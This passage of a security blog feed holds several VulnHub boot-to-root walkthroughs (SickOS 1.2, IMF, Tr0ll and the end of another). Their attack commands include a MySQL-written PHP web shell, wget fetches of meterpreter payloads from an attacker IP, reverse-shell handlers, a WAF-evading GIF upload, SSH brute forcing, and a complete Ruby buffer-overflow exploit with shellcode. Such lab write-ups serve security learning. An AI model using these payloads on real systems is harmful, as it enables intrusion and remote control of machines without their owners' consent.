&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; mysql -h vm -u root -p wordpress

mysql&amp;gt;&amp;gt; SELECT &#39;&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]); ?&amp;gt;&#39; INTO OUTFILE &#39;/root/www/rce.php&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/h0gsLrZ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;With remote code execution enabled, an attacker can download a malicious payload that initiates a reverse
shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;# start a web server to host the payload
&amp;gt;&amp;gt; systemctl start apache2

#create the payload in the web directory
&amp;gt;&amp;gt; msfvenom -p php/meterpreter_reverse_tcp LPORT=443 LHOST=$HOST_IP -t raw &amp;gt; /var/www/html/qq.php

# trigger remote commands that download the payload from the attacker&#39;s computer
&amp;gt;&amp;gt; curl &amp;quot;vm/rce.php?cmd=wget 192.168.110.101/qq.php&amp;quot;
&amp;gt;&amp;gt; curl &amp;quot;vm/rce.php?cmd=ls&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/5WdoFhk.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A listener/handler is configured and the reverse shell kicked off on the victim computer&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; msfconsole -x &amp;quot;use exploit/multi/handler&amp;quot;

msfconsole&amp;gt;&amp;gt; set PAYLOAD php/meterpreter_reverse_tcp
msfconsolemsfconsole&amp;gt;&amp;gt; set LPORT 443
msfconsole&amp;gt;&amp;gt; exploit -j

# start the shell
&amp;gt;&amp;gt; curl &amp;quot;vm/qq.php&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Gxqwui2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;An attacker can now enumerate the contents of the victim&amp;rsquo;s file system, allowing them identify any vulnerable
or mis-configured services that would allow them to elevate privileges. In this case, a cron script was
running a world-modifiable file as root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/I0kuii9.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/bg9dpXH.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Further inspection of this scheduled task:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WXEowHC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This task runs as the root user. All that was needed to become root was to replace the contents of the script
with a reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/vFqTefn.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;additional-discovery&#34;&gt;Additional Discovery&lt;/h2&gt;

&lt;p&gt;SMB enumeration and unprotected shares revealed some employee names and personal notes
&lt;img src=&#34;https://i.imgur.com/VEFkW99.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Port 666 was serving a zip file of a screenshot of another personal note. The exif contained some notes for
the attacker.
&lt;img src=&#34;https://i.imgur.com/vJBqGGF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The anonymous ftp login also leaks information.
&lt;img src=&#34;https://i.imgur.com/fW3Nl8k.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/aFFIp9P.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Port 80 scan initially returned what looked like a user&amp;rsquo;s dotfiles. This gave me the idea that someone may be
running a web server from their home directory.
&lt;img src=&#34;https://i.imgur.com/w3143f7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The Wordpress site could have been used as another vector for a shell by adding a reverse shell plug-in. The
users and passwords were crackable with the rockyou word list. Some users also reused their Wordpress
passwords for their machine accounts.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/v1GKKbb.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Without accessing the computer&amp;rsquo;s &lt;code&gt;/etc/passwd&lt;/code&gt; file, this gathering of information revealed the existence of
the following employees and a accounts:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;barry
dave
elly
fred
garry
harry
heather
john
kathy
pam
peter
scott
tim
vicki
zoe
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>B2R: SickOSv1.2</title>
      <link>https://sec.alexflor.es/post/sickos_1.2/</link>
      <pubDate>Tue, 20 Dec 2016 23:45:50 -0500</pubDate>
      
      <guid>https://sec.alexflor.es/post/sickos_1.2/</guid>
      <description>

&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;

&lt;p&gt;This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be
executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to
explore the system for additional vulnerabilities which could lead to a full compromise. During the
exploration, an outdated version of &lt;code&gt;chkrootkit&lt;/code&gt; was found. By exploiting a known vulnerability in the way
&lt;code&gt;chkrootkit&lt;/code&gt; parses arguments, an attacker could create a malicious file that would later be run by
&lt;code&gt;chkrootkit&lt;/code&gt; as a fully privileged user.&lt;/p&gt;

&lt;h2 id=&#34;tools-used&#34;&gt;Tools used&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;nmap - discovery&lt;/li&gt;
&lt;li&gt;uniscan - web application scanner&lt;/li&gt;
&lt;li&gt;metasploit - exploit framework&lt;/li&gt;
&lt;li&gt;msfvenom - payload generation&lt;/li&gt;
&lt;li&gt;local-linux-enum script - enumeration&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h2&gt;

&lt;p&gt;In order to cut down on typing, once the IP of the victim computer is discovered, it can be added to the
&lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;echo &amp;quot;192.168.1.188 vm&amp;quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We begin with scanning the victim&amp;rsquo;s machine and find ports 80 and 22.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;❯❯ nmap -p - -A vm | tee nmap.scan
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/jQr872J.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Navigating to the page and checking its source code reveals nothing&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1Oigcfa.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Running &lt;code&gt;uniscan&lt;/code&gt;, a folder named &lt;code&gt;test&lt;/code&gt; is discovered&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;❯❯ uniscan -qweds -u http://vm/ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wU5Wp2v.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The listing appeared to be empty but further examination of the &lt;code&gt;/test&lt;/code&gt; path revealed that it responded to
more than just HTTP methods. &lt;code&gt;COPY&lt;/code&gt; and &lt;code&gt;MOVE&lt;/code&gt; seemed to indicate WebDAV.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;❯❯ curl -vX OPTIONS vm/test
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/6GKZJbc.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This path requires no authentication and thus allows attackers to upload files to the web server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/gSzuoHZ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Verifying successful upload:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/CpTqKyO.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Having uploaded the reverse shell, the Meterpreter handler is constructed&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 80
run -j
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip;and the payload is activated.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;curl http://vm/test/sshhh.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/XQ3a9Q4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Once a shell has been established on the system, an enumeration script reveals what additional
vulnerabilities might lead to a full compromise.&lt;/p&gt;

&lt;p&gt;The installed version of &lt;code&gt;chkrootkit&lt;/code&gt; is outdated and vulnerable to a code execution exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/EJSijYp.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The ExploitDB gives the following description:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/uVIlbic.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Using Metasploit, we create another handler and payload, using the &lt;code&gt;chkrootkit&lt;/code&gt; module. This module will
create/overwrite the &lt;code&gt;/tmp/update&lt;/code&gt; file with the reverse tcp shell of your choosing. The next time
&lt;code&gt;chkrootkit&lt;/code&gt; is run, this update file will connect back to the attacker computer designated in the payload.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/9GKQfrW.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>B2R: IMF Walkthrough</title>
      <link>https://sec.alexflor.es/post/imf_walkthrough/</link>
      <pubDate>Tue, 01 Nov 2016 19:16:02 -0400</pubDate>
      
      <guid>https://sec.alexflor.es/post/imf_walkthrough/</guid>
      <description>&lt;p&gt;After mapping the network and finding our IP address at &lt;code&gt;192.168.1.162&lt;/code&gt;, we can add it to our &lt;code&gt;/etc/hosts&lt;/code&gt;
temporarily to make things a little easier for us.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;echo &amp;quot;192.168.1.162     imf&amp;quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets see what kind of machine we&amp;rsquo;re dealing with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1DmhXnq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, so web only. Great. &lt;code&gt;nikto&lt;/code&gt; didn&amp;rsquo;t reveal any low-hanging fruit so let&amp;rsquo;s dive into the source.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/S4hPuB2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Check that out! Our first flag was hidden in &lt;code&gt;http://imf/contact.php&lt;/code&gt;. This looks like base64. After decoding
we get the clue &lt;code&gt;allthefiles&lt;/code&gt;. Lets keep looking.&lt;/p&gt;

&lt;p&gt;Going back to the source code, I found a javascript file that also looked like it was base64 but it didn&amp;rsquo;t
return any results. After a while of going in circles I took my dog for a walk and pondered about what
&amp;lsquo;allthefiles&amp;rsquo; could mean. When I came back and looked over the source code again, I saw this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ANZ1UgC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;All the files, ey?&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ik1rUga.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If we visit that directory on our webapp&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/75xqVVJ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, no DB here. We&amp;rsquo;re dealing with a hardcoded password which means we&amp;rsquo;re dealing with an equaltiy operator
on the backend or possibly the &lt;code&gt;strcmp()&lt;/code&gt; function. I messed around with nullbyte string termination exploits
here for a while but ultimately ended up nowhere. Let&amp;rsquo;s assume we&amp;rsquo;re dealing with &lt;code&gt;strcmp&lt;/code&gt; since it&amp;rsquo;s easier
to fool a function than to fool an operator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/qo8t92C.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m not very good with PHP, but I&amp;rsquo;m guessing that I need this function to return a &lt;code&gt;0&lt;/code&gt; so I fired up
&lt;a href=&#34;https://repl.it&#34;&gt;repl.it&lt;/a&gt; and started trying to break it. Turns out if you feed it the wrong type (it
expects two strings), it seems to return a &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/iQiFPrC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So if we can feed this function an array from the web form, we might be able to bypass the password check. By
changing the name of the form&amp;rsquo;s password field from &lt;code&gt;pass&lt;/code&gt; to &lt;code&gt;pass[]&lt;/code&gt;, we can do just that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/DpxX4o7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;With the modified form, a BS password, and a username from the Contacts page, we get&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wB0UUP3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The decoded flag just has us click through to the CMS&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;root@kali:~                                                                                                                                                                                     ⍉
❯❯ echo Y29udGludWVUT2Ntcw== | base64 -d
continueTOcms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The CMS has 3 pages to choose from and none of them seemed to have any relevant info. I tried (too long) to
use LFI exploits here, modifying URLs, headers, HTTP methods&amp;hellip; nothing. I was trying to enter an empty
&lt;code&gt;pagename&lt;/code&gt; for like the 100th time when I fat fingered the &amp;ldquo;enter&amp;rdquo; key and hit &lt;code&gt;&#39; + Enter&lt;/code&gt; at the same time
when I saw this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Oqo4ZQg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;SQL! Alright, fired up &lt;code&gt;sqlmap&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/izezAtP.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/uckNUTe.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Looks like we have an image at &lt;code&gt;imfadministrator/images/whiteboard.jpg&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/BBLfAQY.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The QR Code is our next flag &lt;code&gt;flag4{dXBsb2FkcjkOMi5waHA=}&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;root@kali:~                                                                                                                                                                                     ⍉
❯❯ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
uploadr942.php   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We navigate to &lt;code&gt;http://imf/imfadministrator/uploadr942.php&lt;/code&gt; and we get our uploader. After messing around
with it a bit we can see that the response html from a successful upload has a hash of some sort. I&amp;rsquo;m
guessing its the hashed version of the filename in the &lt;code&gt;/uploads&lt;/code&gt; folder.&lt;/p&gt;

&lt;p&gt;Maybe we can craft a malicious image with a reverse_tcp meterpreter payload then insert the new page into our
db so it gets executed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/y8obNV4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s upload it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ePzjKU9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Haha! Whoops. Alright what about just regular command execution:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;cat &amp;lt;&amp;lt;EOF &amp;gt; muahaha.gif
GIF89a
&amp;lt;?php \`id\` ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Since CrappyWAF detects functions calls, we should modify our script to take the command from a query
parameter. Let&amp;rsquo;s replace &lt;code&gt;id&lt;/code&gt; with &lt;code&gt;$cmd=$_GET[&#39;cmd&#39;]; echo $cmd&lt;/code&gt; and try again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/v0uaGPw.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Lets get a shell that&amp;rsquo;s easier to work with with &lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/lXrjIik.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/dRelPbw.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s time to get a sense of the machine we&amp;rsquo;re in. &amp;ldquo;Presence&amp;rdquo;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;interesting processes - knockd, sshd&lt;/li&gt;
&lt;li&gt;interesting files (world readable, executable root files, etc) - &lt;code&gt;/usr/local/bin&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat /usr/local/bin/access_codes #&amp;gt; SYN 7482,8279,9467&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/usr/local/bin/agent&lt;/code&gt; - connect to some sort of agent portal; download it&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;listening ports &lt;code&gt;netstat -plnt&lt;/code&gt; - 7788&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It looks like we&amp;rsquo;ve got a hidden service running on 7788. To enable it, we have to &amp;lsquo;knock&amp;rsquo; in the right order
so the firewalll opens up. If we send SYN packets to 7482 8279 9467, it might open up.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/SgDQYRk.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/SdM3380.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Lets decompile our downloaded binary at &lt;a href=&#34;https://retdec.com/decompilation-run/&#34;&gt;https://retdec.com/decompilation-run/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WnuLN8R.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;We can see on line 49 where the authentication happens. It&amp;rsquo;s comparing against a string that was defined on
line 37, &lt;code&gt;0x2ddd984&lt;/code&gt;. If we pop this into an online hex converter, we get &lt;code&gt;48093572&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rs6S3Yf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After navigating through our binary, we have a place where we have user input. This is looking like it&amp;rsquo;s
going to be a buffer overflow exploit. Once we download our application and run it through &lt;code&gt;gdb&lt;/code&gt;, we confirm
that the report function is vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4CxBLoX.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/bD9RCyw.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Bingo. Plug 0x41366641 into &lt;code&gt;pattern_offset&lt;/code&gt; we see that our buffer ends at 168, meaning our EIP register is
at 169. If we inspect the assembly for the &lt;code&gt;report&lt;/code&gt; function, we see that our report string is stored in EAX.
Because we have control of both EIP and EAX, it makes sense that we use this control to point one to the
other. We can place our exploit at the beginning of EAX by simply injecting it as the &amp;ldquo;report&amp;rdquo;. We&amp;rsquo;ll then
pad the input string until it&amp;rsquo;s 168 characters long. Then, well tell EIP that it should return to the
beginning of EAX where our payload is waiting.  If we search to see if EAX is ever called, we can use that
address in EIP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/R7BFi8b.png&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://i.imgur.com/3yWsjBr.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Lets generate our shellcode and start to write the exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.161 LPORT=4444 -f ruby -b &amp;quot;\x00\x0a\x0d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;require &#39;socket&#39;

host = &#39;192.168.1.162&#39;

if ARGV[0] == &#39;knock&#39;
  [7482, 8279, 9467].each do |port|
    puts &amp;quot;knocking on #{port}&amp;quot;
    `nmap -Pn --host_timeout 201 --max-retries 0 -p #{port} #{host} &amp;amp;&amp;gt;/dev/null`
  end
end

buf = 
&amp;quot;\xda\xd4\xd9\x74\x24\xf4\x58\xbb\xc8\x28\xf5\xc3\x29\xc9&amp;quot; +
&amp;quot;\xb1\x12\x31\x58\x1a\x83\xc0\x04\x03\x58\x16\xe2\x3d\x19&amp;quot; +
&amp;quot;\x2e\x34\x5e\x09\x93\xe8\xca\xac\xa3\x69\x83\x50\x0e\xf5&amp;quot; +
&amp;quot;\x04\xc9\xf9\x36\x82\xef\x58\xde\xd0\xef\x8b\x43\x5d\x0e&amp;quot; +
&amp;quot;\xc1\x1d\x05\x81\x47\xb5\x3c\xc0\x2b\xf4\xbe\xb1\xab\xbf&amp;quot; +
&amp;quot;\xbe\xa5\xb3\xbf\x37\x26\x72\x54\x4b\x68\x96\xa7\xe3\x17&amp;quot; +
&amp;quot;\x94\x38\x58\x61\xc7\xa0\xe8\x7d\xb8\xd0\xd9\xfe\x47\x37&amp;quot;

eip = &amp;quot;\x63\x85\x04\x08&amp;quot;

exploit = buf + &amp;quot;A&amp;quot;*70 + eip

s = TCPSocket.new(host, 7788)
puts s.readpartial(512)
s.write(&amp;quot;48093572\n&amp;quot;)

puts s.readpartial(512)
s.write(&amp;quot;3\n&amp;quot;)

puts s.readpartial(512)
s.write(exploit + &amp;quot;\n&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;rsquo;s run it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ImmvfQj.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And there we have it! Thanks for reading!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>B2R: Tr0ll Walkthrough</title>
      <link>https://sec.alexflor.es/post/b2r_troll_walkthrough/</link>
      <pubDate>Thu, 20 Oct 2016 20:57:00 -0400</pubDate>
      
      <guid>https://sec.alexflor.es/post/b2r_troll_walkthrough/</guid>
      <description>&lt;p&gt;A couple of weeks ago, work sent me to a security class for an upcoming product. While there, I learned about
&lt;a href=&#34;https://vulnhub.com&#34;&gt;vulnhub&lt;/a&gt;, a repository of intentionally vulnerable virtual machines for anyone to
compromise. Since coming back, vulnhub has become my new obsession. Here&amp;rsquo;s a walkthrough of my attempt.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note: I struggled a bit more that this writeup lets on. The struggle is ommited for clarity and brevity.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;__&lt;/p&gt;

&lt;p&gt;After finding the VM with an nmap scan, we see a couple of open ports.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2100:03:55.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Upon browsing to the web page, we&amp;rsquo;re greeted with our good friend, the troll.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2111:10:57.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;With the CTFs I&amp;rsquo;ve done so far, I&amp;rsquo;ve run &lt;code&gt;nikto&lt;/code&gt; or &lt;code&gt;uniscan&lt;/code&gt;, to find useful information about the site.
There&amp;rsquo;s almost always a &lt;code&gt;robots.txt&lt;/code&gt; file. Let&amp;rsquo;s start there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2111:15:06.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;OK, so another troll face. Uniscan and Nikto brought up nothing either. I guess it&amp;rsquo;s off to the FTP service
then.&lt;/p&gt;

&lt;p&gt;I run &lt;code&gt;nmap -A&lt;/code&gt; against the FTP port and see that I get a name and version number. Searchsploit doesn&amp;rsquo;t turn
up anything useful so I try to log in as an anonymous user and bingo; next clue.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2111:20:43.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s take a look at what&amp;rsquo;s inside (superfluous &lt;code&gt;grep&lt;/code&gt; added for display purposes)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2111:44:15.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So we get the string &amp;lsquo;sup3rs3cr3tdirlol&amp;rsquo;. Navigating there gets a directory listing with one file. Let&amp;rsquo;s
download it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;$&amp;gt; curl -L 192.168.110.103/sup3rs3cr3tdirlol/roflmao
$&amp;gt; file roflmao
# shows it&#39;s a binary file

$&amp;gt; strings roflmao
# ..snip..
# Find address 0x0856BF to proceed
# ..snip..
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;During CTFs I usually append unique words I run into to a dictionary so I can either use them for brute force
attacks or for enumerating web directories with a tool like &lt;code&gt;dirbuster&lt;/code&gt;. It wasn&amp;rsquo;t very long at this point
and given the trolling nature of this challenge so far I thought maybe I should take our string&amp;rsquo;s words
literally. That, and it wasn&amp;rsquo;t a real memory address at only 3 bytes long.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2112:04:00.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Awesome! I downloaded the files which had what looked like usernames and a single password. One folder was
called &amp;lsquo;this_folder_contains_the_password&amp;rsquo;. Again, taking things literally, I made a quick and dirty script
to take all the words in this folder and append them to my wordlist.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby.prettyprint&#34;&gt;require &#39;nokogiri&#39;
require &#39;open-uri&#39;

url = &#39;http://192.168.110.103/0x0856BF/this_folder_contains_the_password&#39;
data = open(url).read
page = Nokogiri::HTML(data)

def print_tree(node, list = [])
  return list if node.children.empty?
  node.children.inject(list) do |memo, child|
    text = child.text.split(&amp;quot; &amp;quot;).map(&amp;amp;:strip) unless child.text.nil?
    memo.push(*text) if text
    print_tree(child, memo)
  end
end

puts print_tree(page).to_a.sort.uniq
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;ruby scrape.rb &amp;gt;&amp;gt; word.list
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This seemed like a good time to attack the ssh port with &lt;code&gt;hydra&lt;/code&gt; and our new lists. After a couple of
attempts, the SSH port stopped letting me try to authenticate. I went through the attack again, reversing the
user list, password list, then both, waiting for the ssh port to reset between attempts. And then&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2113:45:29.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Once we&amp;rsquo;re logged in, we&amp;rsquo;re immediately kicked off and we see the following message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2113:50:33.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;OK, after a few more logons, I notice it happens every 5 minutes&amp;hellip; cron job.&lt;/p&gt;

&lt;p&gt;In the meantime, I uploaded an enumeration script to &lt;code&gt;/tmp&lt;/code&gt;, but notice that it also gets deleted about every
2 minutes. Another cron job?&lt;/p&gt;

&lt;p&gt;I tried to manually see if there were any SUID binaries to exploit or any world-writable files&lt;/p&gt;

